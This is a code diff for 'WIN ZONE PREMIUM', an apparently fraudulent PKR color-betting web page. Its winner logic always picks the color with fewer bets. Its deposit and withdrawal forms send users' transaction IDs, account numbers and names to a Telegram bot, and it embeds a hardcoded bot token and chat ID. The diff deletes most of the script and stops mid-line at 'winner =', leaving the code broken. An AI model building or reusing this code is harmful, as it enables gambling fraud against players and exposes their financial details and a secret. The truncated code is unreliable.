@@ -19,6 +19,20 @@
             font-size: 20px;
             font-weight: bold;
             border-bottom: 2px solid #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        /* LOGO STYLE */
+        .app-logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid #f1c40f;
+            display: none; /* Logo upload hone par automatic show hoga */
         }
         .balance-card {
             background: linear-gradient(135deg, #2c3e50, #3498db);
@@ -148,7 +162,10 @@
 </head>
 <body>
 
-    <div class="header">WIN ZONE PREMIUM</div>
+    <div class="header">
+        <img id="logoImg" class="app-logo" src="logo.png" alt="Logo" onerror="this.style.display='none';">
+        <span id="headerText">WIN ZONE PREMIUM</span>
+    </div>
 
     <div class="balance-card">
         <div style="font-size: 14px; opacity: 0.8;">Your Balance</div>
@@ -165,8 +182,8 @@
     </div>
 
     <div class="input-section">
-        <label style="display:block; margin-bottom: 8px;">Enter Bet Amount:</label>
-        <input type="number" id="betAmount" value="100" min="10">
+        <label style="display:block; margin-bottom: 8px;">Enter Bet Amount (Min: 30):</label>
+        <input type="number" id="betAmount" value="30" min="30">
     </div>
 
     <div class="color-buttons">
@@ -179,7 +196,6 @@
         <div>System initialized. Waiting for bets...</div>
     </div>
 
-    <!-- DEPOSIT MODAL -->
     <div id="depositModal" class="modal">
         <div class="modal-content">
             <h3>Deposit Funds</h3>
@@ -203,7 +219,6 @@
         </div>
     </div>
 
-    <!-- WITHDRAW MODAL -->
     <div id="withdrawModal" class="modal">
         <div class="modal-content">
             <h3>Withdraw Funds</h3>
@@ -227,6 +242,10 @@
         let timeLeft = 30;
         let fakeBetsPool = { Red: 0, Green: 0 };
 
+        // Real-time Telegram Verification Check
+        const token = "8854952702:AAFEJrRKpYI8up9CdtGeA5LSKMzeHKNq2Zg";
+        const chatId = "8608893352";
+
         // Countdown Timer Logic
         const timerInterval = setInterval(() => {
             timeLeft--;
@@ -238,9 +257,13 @@
             document.getElementById('timer').innerText = `00:${seconds}`;
         }, 1000);
 
-        // Bet Lagane Ka Feature
+        // Bet Lagane Ka Feature (Min 30 PKR)
         function placeBet(color) {
             let amount = parseInt(document.getElementById('betAmount').value);
+            if (isNaN(amount) || amount < 30) {
+                alert("Kam se kam Bet PKR 30 ki honi chahiye!");
+                return;
+            }
             if (amount > currentBalance) {
                 alert("Insufficient Balance! Pehle deposit karein.");
                 return;
@@ -259,101 +282,4 @@
             } else if (fakeBetsPool.Green < fakeBetsPool.Red) {
                 winner = "Green";
             } else {
-                winner = Math.random() > 0.5 ? "Red" : "Green";
-            }
-            addLog(`🏆 Round Finished! Winner is [${winner}]`);
-            fakeBetsPool = { Red: 0, Green: 0 };
-        }
-
-        function addLog(text) {
-            let logSection = document.getElementById('logSection');
-            let newLog = document.createElement('div');
-            newLog.innerText = text;
-            logSection.appendChild(newLog);
-            logSection.scrollTop = logSection.scrollHeight;
-        }
-
-        // Modal Open/Close Functions
-        function openModal(id) { document.getElementById(id).style.display = "flex"; }
-        function closeModal(id) { document.getElementById(id).style.display = "none"; }
-
-        // Deposit Process Submission with Telegram Notification
-        function submitDeposit() {
-            let amount = document.getElementById('depAmount').value;
-            let trx = document.getElementById('depTrx').value;
-            let method = document.getElementById('depMethod').value;
-
-            if(!amount || !trx) {
-                alert("Meherbani karke Amount aur TRX ID dono enter karein!");
-                return;
-            }
-
-            // Telegram API Integration
-            let token = "8854952702:AAFEJrRKpYI8up9CdtGeA5LSKMzeHKNq2Zg";
-            let chatId = "8608893352";
-            let message = `💰 *NEW DEPOSIT REQUEST* 💰\n\n🔹 *Method:* ${method}\n🔹 *Amount:* PKR ${amount}\n🔹 *TRX ID:* \`${trx}\` \n\nVerify the amount in your wallet and update user balance.`;
-
-            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-            fetch(url)
-            .then(response => {
-                if(response.ok) {
-                    alert(`Deposit Request Sent!\nMethod: ${method}\nAmount: PKR ${amount}\nTRX ID: ${trx}\n\nAdmin verification ke baad balance add ho jayega.`);
-                    addLog(`⏳ Deposit Request submitted: PKR ${amount} via ${method} (Pending)`);
-                } else {
-                    alert("Kuch masla aya hai request bhejne mein. Dobara koshish karein.");
-                }
-            })
-            .catch(err => alert("Network error! Try again."));
-
-            closeModal('depositModal');
-            
-            // Clear Inputs
-            document.getElementById('depAmount').value = '';
-            document.getElementById('depTrx').value = '';
-        }
-
-        // Withdraw Process Submission with Telegram Notification
-        function submitWithdraw() {
-            let amount = parseInt(document.getElementById('withAmount').value);
-            let account = document.getElementById('withAccount').value;
-            let name = document.getElementById('withName').value;
-            let method = document.getElementById('withMethod').value;
-
-            if(!amount || !account || !name) {
-                alert("Saari fields fill karna lazmi hai!");
-                return;
-            }
-            if(amount > currentBalance) {
-                alert("Aapka balance withdraw amount se kam hai!");
-                return;
-            }
-
-            currentBalance -= amount;
-            document.getElementById('balance').innerText = `PKR ${currentBalance}`;
-
-            // Telegram API Integration
-            let token = "8854952702:AAFEJrRKpYI8up9CdtGeA5LSKMzeHKNq2Zg";
-            let chatId = "8608893352";
-            let message = `📤 *NEW WITHDRAW REQUEST* 📤\n\n🔹 *Method:* ${method}\n🔹 *Amount:* PKR ${amount}\n🔹 *Account:* \`${account}\`\n🔹 *Name:* ${name}\n\nTransfer the funds within 24 hours.`;
-
-            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-            fetch(url)
-            .then(response => {
-                if(response.ok) {
-                    alert(`Withdrawal Request Sent!\nAmount: PKR ${amount}\nAccount: ${account}\n\nAdmin 24 ghante ke andar transfer kar dega.`);
-                    addLog(`📤 Withdraw Request: PKR ${amount} sent to ${account} (${method})`);
-                }
-            });
-
-            closeModal('withdrawModal');
-
-            // Clear Inputs
-            document.getElementById('withAmount').value = '';
-            document.getElementById('withAccount').value = '';
-            document.getElementById('withName').value = '';
-        }
-    </script>
-</body>
-</html>
+                winner =
